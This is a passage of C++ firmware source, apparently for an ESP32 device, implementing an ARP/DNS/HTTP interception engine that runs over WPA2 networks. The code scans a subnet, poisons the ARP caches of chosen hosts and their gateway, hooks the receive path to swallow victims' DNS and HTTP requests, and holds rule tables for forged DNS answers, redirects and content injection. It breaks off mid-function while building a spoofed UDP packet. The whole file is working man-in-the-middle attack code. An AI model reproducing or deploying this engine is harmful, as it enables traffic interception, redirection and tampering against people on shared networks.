#if !defined(LITE_VERSION)

/**
 * @file net_spoof.cpp
 * @brief Headless ARP / DNS / HTTP interception engine (see net_spoof.h).
 *
 * Layout of the file:
 *   1. state and small helpers (MAC strings, checksums)
 *   2. ethernet frame transmit
 *   3. ARP: build, send, resolve, discovery scan
 *   4. ARP spoof pairs + the service task that keeps them poisoned
 *   5. the layer-2 hook that copies interesting frames into a slot pool
 *   6. the service task body: answer DNS queries / HTTP requests
 *   7. rules, captures and the public API
 *
 * Everything that leaves the radio goes out through esp_wifi_internal_tx() on
 * the *station* interface, so it is encrypted by the hardware with the
 * association key. That is what makes this work on WPA2 (see net_spoof.h).
 *
 * Concurrency: the layer-2 hook runs in the WiFi receive path and must never
 * allocate or block, so it only claims a preallocated slot, copies bytes into
 * it and marks it ready. All real work (frame building, rule matching) happens
 * in the service task. Engine state is guarded by a FreeRTOS mutex, held only
 * for short copies and never across a blocking call.
 */

#include "net_spoof.h"

#include "core/wifi/wifi_common.h"
#include "modules/wifi/wifi_atks.h"
#include <globals.h>

#include <WiFi.h>
#include <esp_netif.h>
#include <esp_netif_net_stack.h>
#include <esp_private/wifi.h>
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/inet.h>
#include <lwip/netif.h>
#include <lwip/tcpip.h>

#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <freertos/task.h>

// ===========================================================================
// 1. State and small helpers
// ===========================================================================

/// One queued frame handed from the layer-2 hook to the service task.
struct NetSpoofSlot {
    volatile uint8_t state; // 0 free, 1 filling, 2 ready
    uint8_t kind;           // 0 = DNS query, 1 = HTTP request
    uint8_t clientMac[6];
    uint8_t _pad;
    uint32_t srcIp;         // wire order, as seen in the frame
    uint32_t dstIp;         // wire order
    uint16_t srcPort;
    uint16_t dstPort;
    uint32_t seq;
    uint32_t ack;
    uint8_t flags;
    uint16_t payloadLen;    // full L4 payload length on the wire
    uint16_t copyLen;       // bytes actually copied into data
    uint8_t data[NETSPOOF_HOOK_COPY];
};

struct NetSpoofPair {
    IPAddress target;
    IPAddress gateway;
    uint8_t targetMac[6];
    uint8_t gatewayMac[6];
    uint32_t since;
};

static NetSpoofTarget s_targets[NETSPOOF_MAX_TARGETS];
static int s_targetCount = 0;

static NetSpoofPair s_pairs[NETSPOOF_MAX_PAIRS];
static int s_pairCount = 0;
static uint32_t s_arpFrames = 0;
static uint32_t s_arpSince = 0;

static NetSpoofRule s_dnsRules[NETSPOOF_MAX_RULES];
static int s_dnsRuleCount = 0;
static NetSpoofRule s_redirRules[NETSPOOF_MAX_RULES];
static int s_redirCount = 0;
static NetSpoofRule s_injectRules[NETSPOOF_MAX_RULES];
static int s_injectCount = 0;

static bool s_dnsActive = false;
static bool s_httpActive = false;
static uint32_t s_dnsQueries = 0;
static uint32_t s_dnsAnswers = 0;
static uint32_t s_httpRequests = 0;
static uint32_t s_httpRedirected = 0;
static uint32_t s_httpInjected = 0;

static NetSpoofCapture s_captures[NETSPOOF_MAX_CAPTURES];
static int s_captureCount = 0; // valid entries, newest at index 0

static NetSpoofSlot s_slots[NETSPOOF_QUEUE_DEPTH];
static portMUX_TYPE s_slotMux = portMUX_INITIALIZER_UNLOCKED;

static SemaphoreHandle_t s_mtx = NULL;      // guards pairs / rules / captures
static TaskHandle_t s_svcTask = NULL;
static volatile bool s_svcRun = false;

static netif_input_fn s_prevInput = NULL;
static struct netif *s_hookedNetif = NULL;

static uint8_t s_myMac[6] = {0};
static uint8_t s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/// Frames built in these buffers; internal RAM so they stay DMA-capable.
static uint8_t s_txFrame[NETSPOOF_FRAME_MAX + 16];
static uint8_t s_l4[NETSPOOF_FRAME_MAX];
static uint8_t s_l4b[NETSPOOF_FRAME_MAX];
static uint16_t s_ipId = 0;

static void _lock() {
    if (s_mtx) xSemaphoreTake(s_mtx, portMAX_DELAY);
}
static void _unlock() {
    if (s_mtx) xSemaphoreGive(s_mtx);
}

static void _ensure_mutex() {
    if (!s_mtx) s_mtx = xSemaphoreCreateMutex();
}

static String _macStr(const uint8_t *m) {
    char buf[18];
    snprintf(
        buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]
    );
    return String(buf);
}

static bool _sameMac(const uint8_t *a, const uint8_t *b) { return memcmp(a, b, 6) == 0; }

static bool _isZeroMac(const uint8_t *m) {
    for (int i = 0; i < 6; i++)
        if (m[i]) return false;
    return true;
}

/// Wire-order 32-bit of an IPAddress (same byte order as the network).
static uint32_t _ip32(const IPAddress &ip) { return (uint32_t)ip; }

// --- checksums (16-bit ones-complement, fed with wire-order data) ---------

static uint32_t _sum16(const uint8_t *data, size_t len, uint32_t acc) {
    size_t i = 0;
    for (; i + 1 < len; i += 2) acc += ((uint16_t)data[i] << 8) | data[i + 1];
    if (i < len) acc += (uint16_t)data[i] << 8;
    return acc;
}

static uint16_t _finish16(uint32_t acc) {
    while (acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
    return (uint16_t)(~acc);
}

static void _put16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFF);
}

static void _put32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

/**
 * @brief Read a 32-bit big-endian field into a host-order value.
 *
 * TCP sequence numbers are arithmetic values (the forged ACK is seq + payloadLen),
 * so they have to be read as numbers rather than copied as opaque bytes. Pair this
 * with _put32(), which writes a host-order value back out big-endian.
 */
static uint32_t _rd32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

// ===========================================================================
// 2. Ethernet frame transmit
// ===========================================================================

static bool _tx(const uint8_t *frame, size_t len) {
    if (len < 14 || len > NETSPOOF_FRAME_MAX) return false;
    if (esp_wifi_internal_tx(WIFI_IF_STA, (void *)frame, (uint16_t)len) != ESP_OK) return false;
    return true;
}

/// Wrap an ethernet header around @p payload and put it on the air.
static bool _txEth(
    const uint8_t dst[6], const uint8_t src[6], uint16_t etherType, const uint8_t *payload, size_t len
) {
    if (14 + len > sizeof(s_txFrame)) return false;
    memcpy(s_txFrame, dst, 6);
    memcpy(s_txFrame + 6, src, 6);
    _put16(s_txFrame + 12, etherType);
    memcpy(s_txFrame + 14, payload, len);
    return _tx(s_txFrame, 14 + len);
}

// ===========================================================================
// 3. ARP
// ===========================================================================

#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2

/**
 * @brief Send one ARP packet.
 *
 * @param ethDst ethernet destination
 * @param senderMac/senderIp the (possibly forged) ARP sender pair
 * @param targetMac/targetIp the ARP target pair
 */
static bool _sendArp(
    const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
    const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
) {
    uint8_t frame[42];
    memcpy(frame, ethDst, 6);
    memcpy(frame + 6, s_myMac, 6);
    _put16(frame + 12, 0x0806); // ARP

    uint8_t *arp = frame + 14;
    _put16(arp + 0, 1);      // ethernet
    _put16(arp + 2, 0x0800); // IPv4
    arp[4] = 6;
    arp[5] = 4;
    _put16(arp + 6, opcode);
    memcpy(arp + 8, senderMac, 6);
    memcpy(arp + 14, senderIp, 4);
    memcpy(arp + 18, targetMac, 6);
    memcpy(arp + 24, targetIp, 4);

    bool any = false;
    for (int i = 0; i < repeat; i++) {
        if (_tx(frame, sizeof(frame))) any = true;
        s_arpFrames++;
        if (repeat > 1) vTaskDelay(pdMS_TO_TICKS(2));
    }
    return any;
}

static struct netif *_staNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return NULL;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

bool netspoof_wifi_ready(String &err) {
    if (!wifiConnected || !WiFi.isConnected() || WiFi.status() != WL_CONNECTED) {
        err = "not associated with an access point (connect first: wifi.connect(ssid, pw))";
        return false;
    }
    return true;
}

void netspoof_my_mac(uint8_t mac[6]) {
    if (!wifiConnected) return; // leave mac untouched when the station is down
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
    if (mac) memcpy(mac, s_myMac, 6);
}

/// Look an address up in the LwIP ARP table.
static bool _arpTableLookup(const IPAddress &ip, uint8_t mac[6]) {
    struct netif *iface = _staNetif();
    if (!iface) return false;

    ip4_addr_t want = {_ip32(ip)};
    ip4_addr_t *foundIp = NULL;
    eth_addr *foundMac = NULL;
    struct netif *foundNetif = NULL;

    bool ok = false;
    LOCK_TCPIP_CORE();
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        if (!etharp_get_entry(i, &foundIp, &foundNetif, &foundMac)) continue;
        if (!foundIp || !foundMac) continue;
        if (foundIp->addr != want.addr) continue;
        memcpy(mac, foundMac->addr, 6);
        ok = true;
        break;
    }
    UNLOCK_TCPIP_CORE();
    return ok && !_isZeroMac(mac);
}

bool netspoof_resolve_mac(const IPAddress &ip, uint8_t mac[6], uint32_t timeoutMs) {
    if (_arpTableLookup(ip, mac)) return true;

    struct netif *iface = _staNetif();
    if (!iface) return false;

    ip4_addr_t target = {_ip32(ip)};
    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    etharp_request(iface, &target);
    UNLOCK_TCPIP_CORE();

    uint32_t start = millis();
    if (timeoutMs < 100) timeoutMs = 100;
    while (millis() - start < timeoutMs) {
        vTaskDelay(pdMS_TO_TICKS(50));
        if (_arpTableLookup(ip, mac)) return true;
    }
    return false;
}

bool netspoof_gateway_info(IPAddress &gw, uint8_t mac[6]) {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return false;
    esp_netif_ip_info_t info;
    if (esp_netif_get_ip_info(sta, &info) != ESP_OK) return false;
    if (info.gw.addr == 0) return false;

    gw = IPAddress(info.gw.addr);
    if (_arpTableLookup(gw, mac)) return true;

    // The gateway MAC is usually the AP's BSSID on an infrastructure network.
    wifi_ap_record_t ap;
    if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) {
        memcpy(mac, ap.bssid, 6);
        return true;
    }
    return false;
}

/**
 * @brief ARP-scan the local subnet, filling the target list.
 *
 * One ARP request is queued per address and the table is drained every
 * ARP_TABLE_SIZE requests, exactly like Bruce's ARPScanner. The wait per
 * address is what bounds the runtime, so the whole scan finishes inside
 * @p timeoutMs even on a /24.
 */
int netspoof_scan_targets(uint32_t timeoutMs, String &err) {
    if (!netspoof_wifi_ready(err)) return -1;

    struct netif *iface = _staNetif();
    if (!iface) {
        err = "station netif not available";
        return -1;
    }

    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t info;
    if (esp_netif_get_ip_info(sta, &info) != ESP_OK) {
        err = "could not read the station IP configuration";
        return -1;
    }

    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);

    IPAddress myIp((uint32_t)info.ip.addr);
    IPAddress gwIp((uint32_t)info.gw.addr);
    uint8_t gwMac[6] = {0};
    bool gwMacOk = netspoof_gateway_info(gwIp, gwMac);

    uint32_t myHe = ntohl((uint32_t)myIp);
    uint32_t maskHe = ntohl((uint32_t)IPAddress((uint32_t)info.netmask.addr));
    uint32_t network = ntohl((uint32_t)gwIp) & maskHe;
    uint32_t broadcast = network | (~maskHe);
    uint32_t hosts = broadcast - network - 1;
    if (hosts == 0 || hosts > 65534) {
        err = "unsupported subnet size";
        return -1;
    }

    // Budget: at most ~15 ms per host, capped by the caller's timeout.
    uint32_t perHost = 15;
    uint32_t budget = timeoutMs > 0 ? timeoutMs : 8000;
    uint32_t maxHosts = budget / perHost;
    if (maxHosts < 8) maxHosts = 8;

    s_targetCount = 0;
    int tableCount = 0;
    uint32_t sent = 0;
    uint32_t start = millis();

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    for (uint32_t ipHe = network + 1; ipHe < broadcast && sent < maxHosts; ipHe++) {
        if (ipHe == myHe || ipHe == ntohl((uint32_t)gwIp)) continue;

        ip4_addr_t target = {htonl(ipHe)};
        LOCK_TCPIP_CORE();
        etharp_request(iface, &target);
        UNLOCK_TCPIP_CORE();
        sent++;
        tableCount++;

        if (tableCount >= ARP_TABLE_SIZE) {
            tableCount = 0;
            // Drain into the target list.
            LOCK_TCPIP_CORE();
            for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *foundIp = NULL;
                eth_addr *foundMac = NULL;
                struct netif *foundNetif = NULL;
                if (!etharp_get_entry(i, &foundIp, &foundNetif, &foundMac)) continue;
                if (!foundIp || !foundMac) continue;
                if (s_targetCount >= NETSPOOF_MAX_TARGETS) break;
                if (_isZeroMac(foundMac->addr)) continue;

                IPAddress hostIp((uint32_t)foundIp->addr);
                bool dup = false;
                for (int d = 0; d < s_targetCount; d++) {
                    if (s_targets[d].ip == hostIp) {
                        dup = true;
                        break;
                    }
                }
                if (dup) continue;

                NetSpoofTarget &t = s_targets[s_targetCount++];
                t.ip = hostIp;
                memcpy(t.mac, foundMac->addr, 6);
                t.macStr = _macStr(t.mac);
                t.gateway = (hostIp == gwIp);
                t.spoofed = false;
                memset(t.pairedWith, 0, 6);
            }
            UNLOCK_TCPIP_CORE();
        }

        vTaskDelay(pdMS_TO_TICKS(perHost));
    }

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    // The gateway is usually missing from the table (we never ARP for it); add it
    // explicitly so getTargets() always shows the interesting host.
    bool haveGw = false;
    for (int i = 0; i < s_targetCount; i++)
        if (s_targets[i].gateway) haveGw = true;
    if (!haveGw && s_targetCount < NETSPOOF_MAX_TARGETS) {
        uint8_t gmac[6];
        if (gwMacOk || netspoof_resolve_mac(gwIp, gmac, 1500)) {
            if (!gwMacOk) memcpy(gwMac, gmac, 6);
            NetSpoofTarget &t = s_targets[s_targetCount++];
            t.ip = gwIp;
            memcpy(t.mac, gwMac, 6);
            t.macStr = _macStr(gwMac);
            t.gateway = true;
            t.spoofed = false;
            memset(t.pairedWith, 0, 6);
        }
    }

    Serial.printf(
        "[NETSPOOF] scan: %d hosts in %lums (budget %lu, sent %lu)\n",
        s_targetCount,
        (unsigned long)(millis() - start),
        (unsigned long)budget,
        (unsigned long)sent
    );
    return s_targetCount;
}

int netspoof_target_count() { return s_targetCount; }

const NetSpoofTarget *netspoof_target(int idx) {
    if (idx < 0 || idx >= s_targetCount) return NULL;
    return &s_targets[idx];
}

void netspoof_clear_targets() { s_targetCount = 0; }

// ===========================================================================
// 4. ARP spoof pairs + service task
// ===========================================================================

static void _pairsSnapshot(NetSpoofPair *out, int *count, int max) {
    _lock();
    int n = s_pairCount < max ? s_pairCount : max;
    for (int i = 0; i < n; i++) out[i] = s_pairs[i];
    *count = n;
    _unlock();
}

static void _poisonPair(const NetSpoofPair &p, int burst) {
    uint8_t tIp[4], gIp[4];
    uint32_t t = _ip32(p.target), g = _ip32(p.gateway);
    memcpy(tIp, &t, 4);
    memcpy(gIp, &g, 4);

    // Tell the target that the gateway is us.
    _sendArp(p.targetMac, s_myMac, gIp, p.targetMac, tIp, ARP_OP_REPLY, burst);
    // Tell the gateway that the target is us.
    _sendArp(p.gatewayMac, s_myMac, tIp, p.gatewayMac, gIp, ARP_OP_REPLY, burst);
}

/// Restore the two real mappings (unicast reply + broadcast request, RFC 826).
static void _restorePair(const NetSpoofPair &p) {
    uint8_t tIp[4], gIp[4];
    uint32_t t = _ip32(p.target), g = _ip32(p.gateway);
    memcpy(tIp, &t, 4);
    memcpy(gIp, &g, 4);

    for (int round = 0; round < 3; round++) {
        _sendArp(p.targetMac, p.gatewayMac, gIp, p.targetMac, tIp, ARP_OP_REPLY, 3);
        _sendArp(s_bcast, p.gatewayMac, gIp, s_bcast, tIp, ARP_OP_REQUEST, 2);
        _sendArp(p.gatewayMac, p.targetMac, tIp, p.gatewayMac, gIp, ARP_OP_REPLY, 3);
        _sendArp(s_bcast, p.targetMac, tIp, s_bcast, gIp, ARP_OP_REQUEST, 2);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);

    IPAddress gw = gateway;
    if ((uint32_t)gw == 0) {
        esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        esp_netif_ip_info_t info;
        if (!sta || esp_netif_get_ip_info(sta, &info) != ESP_OK || info.gw.addr == 0) {
            err = "could not determine the default gateway";
            return false;
        }
        gw = IPAddress(info.gw.addr);
    }
    if ((uint32_t)target == 0) {
        err = "targetIP is required";
        return false;
    }
    if (target == gw) {
        err = "targetIP must not be the gateway";
        return false;
    }

    uint8_t tMac[6] = {0}, gMac[6] = {0};
    if (!netspoof_resolve_mac(target, tMac, 2000)) {
        err = "target did not answer ARP (wrong subnet or host down)";
        return false;
    }
    if (!netspoof_gateway_info(gw, gMac)) {
        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
        return false;
    }
    if (_sameMac(tMac, gMac) || _sameMac(tMac, s_myMac)) {
        err = "target resolves to the gateway/our own MAC";
        return false;
    }

    _ensure_mutex();
    _lock();
    // Refresh an existing pair instead of adding a duplicate.
    for (int i = 0; i < s_pairCount; i++) {
        if (s_pairs[i].target == target) {
            s_pairs[i].gateway = gw;
            memcpy(s_pairs[i].targetMac, tMac, 6);
            memcpy(s_pairs[i].gatewayMac, gMac, 6);
            NetSpoofPair copy = s_pairs[i];
            _unlock();
            _poisonPair(copy, 5);
            return true;
        }
    }
    if (s_pairCount >= NETSPOOF_MAX_PAIRS) {
        _unlock();
        err = "too many active ARP pairs (max " + String(NETSPOOF_MAX_PAIRS) + ")";
        return false;
    }
    NetSpoofPair &p = s_pairs[s_pairCount++];
    p.target = target;
    p.gateway = gw;
    memcpy(p.targetMac, tMac, 6);
    memcpy(p.gatewayMac, gMac, 6);
    p.since = millis();
    NetSpoofPair copy = p;
    _unlock();

    if (s_arpSince == 0) s_arpSince = millis();
    _poisonPair(copy, 5);
    Serial.printf(
        "[NETSPOOF] arp pair: %s (%s) <-> %s (%s)\n",
        target.toString().c_str(),
        _macStr(tMac).c_str(),
        gw.toString().c_str(),
        _macStr(gMac).c_str()
    );
    return true;
}

void netspoof_arp_restore_all() {
    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];
    int n = 0;
    _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
    for (int i = 0; i < n; i++) _restorePair(snapshot[i]);

    _lock();
    s_pairCount = 0;
    s_arpSince = 0;
    _unlock();
}

bool netspoof_arp_stop(String &err) {
    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];
    int n = 0;
    _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
    if (n == 0) {
        err = "no ARP spoofing is running";
        return false;
    }
    for (int i = 0; i < n; i++) _restorePair(snapshot[i]);

    _lock();
    s_pairCount = 0;
    s_arpSince = 0;
    _unlock();
    Serial.printf("[NETSPOOF] restored %d ARP pair(s)\n", n);
    return true;
}

bool netspoof_arp_active() {
    _lock();
    bool a = s_pairCount > 0;
    _unlock();
    return a;
}

int netspoof_arp_pair_count() {
    _lock();
    int n = s_pairCount;
    _unlock();
    return n;
}

uint32_t netspoof_arp_frames() { return s_arpFrames; }

uint32_t netspoof_arp_uptime_ms() {
    _lock();
    uint32_t since = s_arpSince;
    _unlock();
    return since == 0 ? 0 : millis() - since;
}

bool netspoof_arp_pair_info(
    int idx, IPAddress &target, IPAddress &gateway, char *targetMac, char *gatewayMac
) {
    _lock();
    if (idx < 0 || idx >= s_pairCount) {
        _unlock();
        return false;
    }
    target = s_pairs[idx].target;
    gateway = s_pairs[idx].gateway;
    String tm = _macStr(s_pairs[idx].targetMac);
    String gm = _macStr(s_pairs[idx].gatewayMac);
    _unlock();
    if (targetMac) strncpy(targetMac, tm.c_str(), 17);
    if (gatewayMac) strncpy(gatewayMac, gm.c_str(), 17);
    return true;
}

bool netspoof_arp_pair_index(const IPAddress &ip, int *idx) {
    _lock();
    for (int i = 0; i < s_pairCount; i++) {
        if (s_pairs[i].target == ip) {
            if (idx) *idx = i;
            _unlock();
            return true;
        }
    }
    _unlock();
    return false;
}

// ===========================================================================
// 5. The layer-2 hook
// ===========================================================================

/// Claim a free slot. Called from the receive path: no allocation, no blocking.
static NetSpoofSlot *_slotClaim() {
    NetSpoofSlot *found = NULL;
    portENTER_CRITICAL(&s_slotMux);
    for (int i = 0; i < NETSPOOF_QUEUE_DEPTH; i++) {
        if (s_slots[i].state == 0) {
            s_slots[i].state = 1;
            found = &s_slots[i];
            break;
        }
    }
    portEXIT_CRITICAL(&s_slotMux);
    return found;
}

static void _slotPublish(NetSpoofSlot *s) {
    portENTER_CRITICAL(&s_slotMux);
    s->state = 2;
    portEXIT_CRITICAL(&s_slotMux);
}

/// Claim the next ready slot (oldest first, which is just index order).
static NetSpoofSlot *_slotTake() {
    NetSpoofSlot *found = NULL;
    portENTER_CRITICAL(&s_slotMux);
    for (int i = 0; i < NETSPOOF_QUEUE_DEPTH; i++) {
        if (s_slots[i].state == 2) {
            s_slots[i].state = 1;
            found = &s_slots[i];
            break;
        }
    }
    portEXIT_CRITICAL(&s_slotMux);
    return found;
}

static void _slotRelease(NetSpoofSlot *s) {
    portENTER_CRITICAL(&s_slotMux);
    s->state = 0;
    portEXIT_CRITICAL(&s_slotMux);
}

/// Parse the question name of a DNS message into dotted lower-case form.
static bool _dnsQuestion(
    const uint8_t *dns, size_t len, uint16_t *txid, char *name, size_t nameCap, uint16_t *qtype,
    uint16_t *qclass
) {
    if (len < 12) return false;
    uint16_t flags = ((uint16_t)dns[2] << 8) | dns[3];
    if (flags & 0x8000) return false; // a response, not a query
    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];
    if (qdcount == 0) return false;
    *txid = ((uint16_t)dns[0] << 8) | dns[1];

    size_t pos = 12, out = 0;
    name[0] = '\0';
    while (pos < len) {
        uint8_t label = dns[pos++];
        if (label == 0) break;
        if ((label & 0xC0) == 0xC0) return false; // compression is not valid in a question
        if (pos + label > len) return false;
        if (out + label + 2 >= nameCap) return false;
        if (out) name[out++] = '.';
        for (uint8_t i = 0; i < label; i++) {
            char c = (char)dns[pos + i];
            if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
            name[out++] = c;
        }
        pos += label;
    }
    name[out] = '\0';
    if (pos + 4 > len) return false;
    *qtype = ((uint16_t)dns[pos] << 8) | dns[pos + 1];
    *qclass = ((uint16_t)dns[pos + 2] << 8) | dns[pos + 3];
    return out > 0;
}

/**
 * @brief Inspect one received frame and queue anything worth answering.
 *
 * Runs on the WiFi receive path, so it only reads the headers, copies a bounded
 * amount of payload into a slot and returns. Anything not understood is passed
 * straight on to the previously installed input handler, which keeps normal
 * station traffic (DHCP, our own TCP) working.
 */
static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
    netif_input_fn next = s_prevInput;
    if (!p || p->tot_len < 34) return next ? next(p, inp) : ERR_OK;

    // Copy the frame into a scratch buffer: pbufs can be chained and the header
    // walk below needs contiguous bytes. One buffer per core keeps two receive
    // paths from overwriting each other.
    static uint8_t scratchBuf[2][NETSPOOF_FRAME_MAX];
    uint8_t *scratch = scratchBuf[xPortGetCoreID() & 1];
    uint16_t total = p->tot_len;
    if (total > NETSPOOF_FRAME_MAX) total = NETSPOOF_FRAME_MAX;
    if (pbuf_copy_partial(p, scratch, total, 0) != total) return next ? next(p, inp) : ERR_OK;

    // Never intercept our own traffic (the station's own DNS/HTTP would
    // otherwise be answered by this engine).
    if (_sameMac(scratch + 6, s_myMac)) return next ? next(p, inp) : ERR_OK;
    if (_isZeroMac(scratch + 6)) return next ? next(p, inp) : ERR_OK;

    uint16_t etherType = ((uint16_t)scratch[12] << 8) | scratch[13];
    if (etherType != 0x0800) return next ? next(p, inp) : ERR_OK; // IPv4 only

    const uint8_t *ip = scratch + 14;
    if ((ip[0] >> 4) != 4) return next ? next(p, inp) : ERR_OK;
    uint8_t ihl = (uint8_t)((ip[0] & 0x0F) * 4);
    if (ihl < 20 || 14u + ihl + 8u > total) return next ? next(p, inp) : ERR_OK;

    uint8_t proto = ip[9];
    if (proto != 17 && proto != 6) return next ? next(p, inp) : ERR_OK;

    uint32_t srcIp, dstIp;
    memcpy(&srcIp, ip + 12, 4);
    memcpy(&dstIp, ip + 16, 4);

    const uint8_t *l4 = ip + ihl;
    uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
    uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
    const uint8_t *payload = NULL;
    uint16_t payloadLen = 0;
    uint32_t seq = 0, ack = 0;
    uint8_t flags = 0;
    uint8_t kind = 0;

    if (proto == 17) {
        if (dstPort != 53) return next ? next(p, inp) : ERR_OK;
        uint16_t udpLen = ((uint16_t)l4[4] << 8) | l4[5];
        if (udpLen < 8 || (uint16_t)(ihl + udpLen) > (uint16_t)(total - 14)) {
            return next ? next(p, inp) : ERR_OK;
        }
        payload = l4 + 8;
        payloadLen = (uint16_t)(udpLen - 8);
        kind = 0;
    } else {
        if (dstPort != 80 && dstPort != 8080) return next ? next(p, inp) : ERR_OK;
        uint8_t dataOff = (uint8_t)((l4[12] >> 4) * 4);
        if (dataOff < 20 || 14u + ihl + dataOff > total) return next ? next(p, inp) : ERR_OK;
        // Host order: _handleHttp() adds to these and _put32() writes host order.
        seq = _rd32(l4 + 4);
        ack = _rd32(l4 + 8);
        flags = l4[13];
        payload = l4 + dataOff;
        payloadLen = (uint16_t)(total - 14 - ihl - dataOff);
        if (payloadLen < 8) return next ? next(p, inp) : ERR_OK;
        kind = 1;
    }
    if (!payloadLen) return next ? next(p, inp) : ERR_OK;

    // Cheap filter so the slot pool is not wasted on unrelated traffic.
    if (kind == 0) {
        uint16_t txid;
        char name[80];
        uint16_t qtype, qclass;
        if (!_dnsQuestion(payload, payloadLen, &txid, name, sizeof(name), &qtype, &qclass)) {
            return next ? next(p, inp) : ERR_OK;
        }
    } else {
        const char *txt = (const char *)payload;
        bool looksHttp = (memcmp(txt, "GET ", 4) == 0 || memcmp(txt, "POST", 4) == 0 ||
                          memcmp(txt, "HEAD", 4) == 0 || memcmp(txt, "PUT ", 4) == 0 ||
                          memcmp(txt, "DELE", 4) == 0 || memcmp(txt, "OPTI", 4) == 0);
        if (!looksHttp) return next ? next(p, inp) : ERR_OK;
    }

    NetSpoofSlot *slot = _slotClaim();
    if (!slot) return next ? next(p, inp) : ERR_OK; // pool busy: let it through

    memcpy(slot->clientMac, scratch + 6, 6);
    slot->kind = kind;
    slot->srcIp = srcIp;
    slot->dstIp = dstIp;
    slot->srcPort = srcPort;
    slot->dstPort = dstPort;
    slot->seq = seq;
    slot->ack = ack;
    slot->flags = flags;
    slot->payloadLen = payloadLen;
    slot->copyLen = payloadLen < NETSPOOF_HOOK_COPY ? payloadLen : NETSPOOF_HOOK_COPY;
    memcpy(slot->data, payload, slot->copyLen);
    _slotPublish(slot);

    // Swallowed on purpose: this board answers the request itself, so the real
    // host must not see it. Nothing is forwarded either way (the ESP cannot
    // route). NOTE: a netif input handler owns the pbuf, so a swallowed frame
    // has to be released here - returning ERR_OK does not free it, and leaking
    // a pbuf per intercepted request would empty the RX pool.
    pbuf_free(p);
    return ERR_OK;
}

static void _hookInstall() {
    if (s_hookedNetif) return;
    struct netif *iface = _staNetif();
    if (!iface) return;
    s_prevInput = iface->input;
    s_hookedNetif = iface;
    iface->input = _nsInputHook;
    Serial.println("[NETSPOOF] L2 hook installed");
}

static void _hookUninstall() {
    if (s_hookedNetif) {
        // Only restore when we are still the installed handler, so a hook owned
        // by another module (NetCut) is never clobbered.
        if (s_hookedNetif->input == _nsInputHook) s_hookedNetif->input = s_prevInput;
        s_hookedNetif = NULL;
        s_prevInput = NULL;
        Serial.println("[NETSPOOF] L2 hook removed");
    }
}

bool netspoof_hook_installed() { return s_hookedNetif != NULL; }

// ===========================================================================
// 6. Answering: DNS replies and HTTP responses
// ===========================================================================

/**
 * @brief Send a UDP datagram in a plain ethernet frame on the station link.
 *
 * @param dstMac station to deliver to
 * @param srcIp/dstIp wire-order addresses (the source is spoofed, e.g. the DNS
 *        server the client asked)
 */
static bool _txUdpRaw(
    const uint8_t dstMac[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 8 + payloadLen;
    if (20 + l4Len > sizeof(s_l4)) return false;

    uint8_t *ip = s_l4;
    ip[0] = 0x45;
    ip[1] = 0x00;
    _put16(ip + 2, (uint16_t)(20 + l4Len));
    _put16(ip + 4, ++s_ipId);
    _put16(ip + 6, 0x0000);
    ip[8] = 64;
    ip[9] = 17;
    _put16(ip + 10, 0);
    // srcIp/dstIp hold wire-order bytes (they were memcpy'd off the received header),
    // which is also what the checksum pseudo-header sums. They must go back on the
    // wire with memcpy: _put32() writes big-endian from a *host-order* value, so on
    // this little-endian part it would byte-reverse the addresses and every client
    // would silently drop the forged packet at the IP layer.
    memcpy(ip + 12, &srcIp, 4);
    memcpy(ip + 16, &dstIp, 4);
    _put16(ip + 10, _finish16(_sum16(ip, 20, 0)));

    uint8_t *udp = ip + 20;
    _put16(udp, srcPort);
    _put16(udp + 2, dstPort);
    _put16(udp + 4, (uint16_t)l4Len);
